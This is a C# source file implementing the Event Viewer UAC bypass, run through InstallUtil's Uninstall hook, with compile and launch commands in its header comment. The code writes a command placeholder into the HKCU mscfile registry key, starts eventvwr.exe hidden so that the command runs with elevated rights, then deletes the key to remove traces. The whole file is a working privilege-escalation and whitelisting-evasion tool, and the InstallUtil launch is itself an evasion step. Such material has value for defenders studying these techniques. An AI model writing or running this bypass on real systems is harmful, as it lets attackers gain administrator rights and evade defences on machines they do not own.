using System;
using System.Linq;
using System.Reflection;
using System.Configuration.Install;
using System.Runtime.InteropServices;
 
using Microsoft.Win32;
/*
InstallUtil.exe C# version of Event Viewer UAC bypass
 
Credits:
- @subTee for InstallUtil technique 
- @enigma0x3 for Event Viewer UAC bypass
    https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/
 
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe EventVwrBypass.cs
C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U EventVwrBypass.exe"
*/
[System.ComponentModel.RunInstaller(true)]
public class Sample : System.Configuration.Install.Installer {
    public override void Uninstall(System.Collections.IDictionary savedState) {
 
        Console.WriteLine("Hello There From Uninstall");
        Unlocker.Exec();
    }
}
public class Unlocker {
    public static void Main() {
        Console.WriteLine("Hello from Main");
    }
     
    public static void Exec() {
         
        RegistryKey key = Microsoft.Win32.Registry.CurrentUser.CreateSubKey(@"Software\Classes\mscfile\shell\open\command", true);
        key.SetValue("", "<PAYLOAD>", Microsoft.Win32.RegistryValueKind.String);
        key.Close();
         
        Console.WriteLine("Key has been created");
         
        System.Diagnostics.Process p = new System.Diagnostics.Process();
        p.StartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
        p.StartInfo.FileName = @"C:\Windows\System32\eventvwr.exe";
        p.Start();
         
        Console.WriteLine("Event Viewer is starting up");
 
        System.Threading.Thread.Sleep(5000);
         
        try {
            p.Kill();
            Console.WriteLine("Killing Event Viewer");
        }
        catch(Exception ex) {
            Console.WriteLine("Event Viewer no longer running");
        }
 
        Console.WriteLine("Cleaning up...");
        key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(@"Software\Classes", true);
        key.DeleteSubKeyTree("mscfile");
        key.Close();
         
        Console.WriteLine("Complete");
    }
}